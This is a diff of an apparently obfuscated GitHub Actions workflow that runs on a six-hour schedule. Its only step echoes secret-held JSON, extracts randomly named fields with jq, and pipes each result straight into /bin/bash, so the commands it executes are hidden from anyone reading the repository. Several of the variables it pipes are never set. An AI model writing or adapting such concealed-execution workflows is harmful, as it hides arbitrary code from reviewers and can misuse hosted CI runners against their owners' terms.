@@ -2,27 +2,21 @@ name: liangtoushang5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 1/6 * * *'
-
+    - cron: '3 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: liangtoushang5678
         env:
-          tt3: ${{ secrets.tt3 }}
+          wo77: ${{ secrets.wo77 }}
         run: |
-          echo $tt3 | jq -r .spd881 | /bin/bash
-          echo $l7 | jq -r .sgmzq26 | /bin/bash
-          echo $t96651 | jq -r .jkpph92 | /bin/bash
-          echo $b52 | jq -r .aveql0296 | /bin/bash
-          echo $t32682 | jq -r .to06 | /bin/bash
-          echo $vmmou30 | jq -r .mso25 | /bin/bash
-          echo $xrblq071 | jq -r .v8291 | /bin/bash
-          echo $erk17 | jq -r .mtha0639 | /bin/bash
-          echo $ii55600 | jq -r .ojcy1 | /bin/bash
-          echo $ftl3829 | jq -r .abxew5 | /bin/bash
-          echo $gvv43 | jq -r .p514 | /bin/bash
-          echo $f10956 | jq -r .kgv7495 | /bin/bash
+          echo $wo77 | jq -r .yhuqq7908 | /bin/bash
+          echo $u4 | jq -r .zrz94 | /bin/bash
+          echo $xv2528 | jq -r .j9063 | /bin/bash
+          echo $nii2028 | jq -r .ottp6 | /bin/bash
+          echo $ip699 | jq -r .v73300 | /bin/bash
+          echo $ucu79328 | jq -r .yr711 | /bin/bash
 
